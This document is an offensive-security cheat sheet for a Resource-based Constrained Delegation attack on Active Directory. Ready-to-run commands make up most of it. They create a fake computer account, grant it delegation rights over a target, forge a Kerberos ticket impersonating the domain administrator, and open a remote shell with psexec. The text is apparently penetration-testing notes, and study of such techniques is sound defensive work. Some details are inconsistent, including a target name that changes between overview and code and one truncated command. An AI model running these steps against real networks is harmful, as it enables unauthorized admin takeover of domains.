# Resource-based Constrained Delegation

# Overview
- We have *code execution* on the computer `(COM01)` as the current user.
- User creates a new computer object `(FAKE01)`.
- User leverages the **WRITE** privilege on the `(COM01)` computer object and updates its object's attribute **msDS-AllowedToActOnBehalfOfOtherIdentity** to enable the newly created computer `(FAKE01)` to impersonate and authenticate any domain user that can then access the target system `(COM01)`.      
`(COM01)` trusts `(FAKE01)` due to the modified *msDS-AllowedToActOnBehalfOfOtherIdentity*.
- We request Kerberos tickets for `(FAKE01)`$ with ability to impersonate an admin user.

# Tools Needed
- [PowerMad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
- [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
- [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)


# Exploitation
*Assumption is that the attacker has access to the system through winrm*
## Local
```powershell
# Verify if user can add new computers
Get-DomainObject -Identity 'dc=domain,dc=local' | select 

# Upload tools
upload Powermad.ps1 Powermad.ps1
upload Rubeus.exe Rubeus.exe

# Import PowerMad
Import-Module Powermad.ps1

# Set variables
Set-Variable -Name "FakeComputer" -Value "FAKE01"
Set-Variable -Name "target" -Value "DC"

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "FakeComputer").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "target").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakeComputer").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "target").Value -Properties PrincipalsAllowedToDelegateToAccount

# With Rubeus, generate the new fake computer object password hashes. (Keep these for the next step)
.\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:domain.local
```

## Remote
```bash
# Generate a ccached TGT
getST.py domain.local/FAKE01 -dc-ip dc.domain.local -impersonate administrator -spn http/dc.domain.local -aesKey <aes key from Rubeus output>

# Set KRB5CCNAME environment variable to point to the newly created ccache file
export KRB5CCNAME=administrator.ccache

# Use psexec.py to connect to the remote server
psexec.py domain.local/administrator@dc.domain.local -no-pass -k
```

# References
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)